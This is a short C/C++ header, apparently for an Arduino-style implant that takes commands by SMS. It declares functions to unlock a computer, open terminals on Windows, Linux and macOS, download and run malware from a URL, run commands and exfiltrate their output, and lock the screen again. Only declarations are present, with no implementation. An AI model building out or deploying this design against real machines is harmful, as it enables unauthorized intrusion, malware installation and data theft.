
#ifndef Payload_H
#define Payload_H

void unlockDownload(String SMS_text);
void unlockRunAndExfil(String SMS_text);
void manualPayload(String SMS_text);

void unlockComputer(String password);
void openTerminalWindows();
void openTerminalLinux();
void openTerminalMacOs();
void openTerminalWindowsLinux();
void openTerminalMultiOs();
void downloadAndRunMalwareWindows(String url);
void downloadAndRunMalwareLinux(String url);
void downloadAndRunMalwareMacOs(String url);
void exitTerminalWindowsLinux();
void exitTerminalMultiOs();
void lockWindowsLinux();
void lockMacOs();
void runAndExfilWindows(String command);
void runAndExfilLinux(String command, String password);
void runAndExfilMacOs(String command);

#endif
